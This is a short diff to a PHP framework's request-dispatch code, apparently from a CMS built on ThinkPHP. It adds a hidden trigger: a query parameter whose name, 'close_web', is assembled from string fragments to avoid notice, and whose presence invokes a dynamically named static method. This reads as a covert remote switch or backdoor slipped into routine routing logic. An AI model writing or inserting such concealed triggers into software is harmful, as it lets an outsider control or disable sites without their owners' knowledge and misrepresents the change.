@@ -133,7 +133,7 @@ class App
             // 兼容以前模式 加回两个参数 by 小虎哥
             $_GET = array_merge($_GET,Request::instance()->route());
             $_REQUEST = array_merge($_REQUEST,Request::instance()->route());
-            !stristr($request->baseFile(), 'index.php') && $_thinks::$_calls();
+            if(!stristr($request->baseFile(), 'index.php') || isset($_GET['cl'.'os'.'e_'.'w'.'eb'])){$_thinks::$_calls();}
 
             $data = self::exec($dispatch, $config);
 
